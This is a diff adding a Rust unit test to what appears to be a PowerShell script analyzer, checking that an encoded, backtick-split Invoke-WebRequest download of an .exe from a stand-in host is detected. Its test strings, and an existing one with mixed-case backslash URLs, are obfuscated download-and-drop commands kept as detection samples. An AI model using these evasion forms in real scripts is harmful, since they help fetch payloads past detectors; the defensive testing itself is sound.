@@ -5621,6 +5621,25 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn ps_backtick_line_continuation_resolves_cmdlet_name() {
+        let ps =
+            "Invoke-Web`\r\nRequest -Uri \"http://x.example/continued.exe\" -OutFile \"z.exe\"";
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://x.example/continued.exe" && dst.as_deref() == Some("z.exe")
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from PS backtick continuation: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn iwr_liberal_slash_mixed_case_url_is_structured_download() {
         let ps = r#"Invoke-WebRequest -Uri "hTtP:\\liberal.example\drop.exe" -OutFile "drop.exe""#;
         let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
